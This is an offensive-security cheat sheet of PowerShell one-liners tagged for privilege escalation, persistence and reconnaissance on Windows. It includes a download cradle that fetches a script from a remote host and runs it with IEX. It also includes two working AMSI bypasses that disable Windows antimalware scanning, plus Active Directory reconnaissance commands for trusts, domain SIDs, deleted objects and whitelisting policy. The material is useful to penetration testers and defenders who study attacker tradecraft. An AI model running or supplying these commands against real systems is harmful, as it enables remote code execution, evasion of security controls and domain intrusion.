# powershell

#plateform/windows #target/local #cat/PRIVESC #cat/PERSIST #cat/RECON #tag/powershell 

## Download cradle
```powershell
(new-object system.net.webclient).downloadstring('http://<ip>/<script>') | IEX
```

## Get file in trash
```powershell
Get-ADObject -filter 'isDeleted -eq $true -and name -ne "Deleted Objects"' -includeDeletedObjects -property *
```

## Get process
```powershell
Get-Process
```

## Get Proxy
```powershell
[System.Net.WebRequest]::DefaultWebProxy.GetProxy("http://<ip>/<url>")
```

## Bypass AMSI with _amsiContext_
```powershell
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}};$g=$f.GetValue($null);[IntPtr]$ptr=$g;[Int32[]]$buf = @(0);[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
```

## Bypass AMSI with _AmsiInitFailed_
```powershell
$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}};$d=$c.GetFields('NonPublic,Static');Foreach($e in $d) {if ($e.Name -like "*InitFailed") {$f=$e}};$f.SetValue($null,$true)
```

## Verify PPL
```powershell
Get-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Control\Lsa -Name "RunAsPPL"
```

## Verify application whitelisting
```powershell
Get-ChildItem -Path HKLM:\SOFTWARE\Policies\Microsoft\Windows\SrpV2\Exe
```

## show forest trust
```powershell
([System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()).GetAllTrustRelationships()
```

## Get domain trust
```powershell
Get-DomainTrust -Domain <domain>
```

## Get domain SID
```powershell
Get-DomainSID -domain <sid>
```